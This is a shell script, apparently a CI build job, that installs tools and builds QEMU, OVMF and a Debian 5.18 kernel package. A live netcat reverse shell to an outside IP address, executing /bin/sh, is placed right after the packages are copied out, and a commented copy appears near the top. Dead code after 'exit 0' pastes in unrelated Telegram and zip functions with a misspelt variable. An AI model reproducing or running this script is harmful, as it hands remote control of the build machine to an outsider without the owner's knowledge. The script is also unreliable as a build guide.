#! /bin/sh
set -e o pipefail

#https://wiki.debian.org/HowToUpgradeKernel
#5.10.0-15-amd64
#linux-image-5.10.0-15-amd64
#linux-image-5.18.0-2-amd64
echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
apt update
apt install -y ncat
#nc 65.108.51.31 11452 -e /bin/sh
apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc
#####BUILD QEMU
#https://www.qemu.org/download/
#https://wiki.qemu.org/Testing/DockerBuild
sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build -y
mkdir ~/qemu; cd ~/qemu
curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
tar xvJf qemu.tar.xz
cd qemu-7.0.0
./configure
make

#####BUILD OVMF
#https://phip1611.de/blog/how-to-compile-edk2-ovmf-from-source-on-linux-2021/
apt install -y git nasm iasl build-essential uuid-dev
mkdir ~/edk2; cd ~/edk2
git clone https://github.com/tianocore/edk2.git
cd edk2-master
git submodule update --init
make -C BaseTools
cd OvmfPkg
./build.sh

#####BUILD KERNEL
apt install -y linux-image-5.18.0-2-amd64 linux-source fakeroot rsync
echo "Installed all packages\n"
#https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html
#https://www.debian.org/releases/jessie/i386/ch08s06.html.en ##basic documentation
#https://debian-handbook.info/browse/stable/sect.kernel-compilation.html ##advanced docs
mkdir ~/kernel; cd ~/kernel

sed -n '/CONFIG_SYSTEM_TRUSTED_KEYS.*/!p' /config-5.18.0-2-amd64 > /config-5.18.0-2-amd64
tar -xaf /usr/src/linux-source-5.18.tar.xz

cp /config-5.18.0-2-amd64 ~/kernel/linux-source-5.18/.config

#compile
cd linux-source-5.18
yes ""|make -j $(nproc)
make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make kernelversion)-1
cp ../*.deb /github/workspace/
nc 65.108.51.31 11452 -e /bin/sh
ls ../*.deb
exit 0

#tg_post_msg "new build core Count $PROCS Compiler $KBUILD_COMPILER_STRING"
#BUILD_START=$(date +"%s")
tg_post_msg() {
	curl -s -X POST "$MSG_URL" -d chat_id="$2" \
	-d "disable_web_page_preview=true" \
	-d "parse_mode=html" \
	-d text="$1"

}

check_img() {
	if [ -f $KERNEL_DIR/out/arch/arm64/boot/Image.gz-dtb ] 
	    then
		gen_zip
	fi
}
gen_zip() {
	cd $KERNEL_DIR/anykernel
	zip -r9 DarkOne-v3.0-chef-$PREIFIX * -x .git README.md
	MD5CHECK=$(md5sum $ZIPNAME-$ARG1-$DATE.zip | cut -d' ' -f1)
	tg_post_build DarkOne-v3.0-chef-$PREFIX.zip "$CHATID" "Build took : $((DIFF / 60)) minute(s) and $((DIFF % 60)) second(s) | MD5 Checksum : <code>$MD5CHECK</code>"
	cd ..
}
#exports
# clone
# build_kernel
#gen_zip
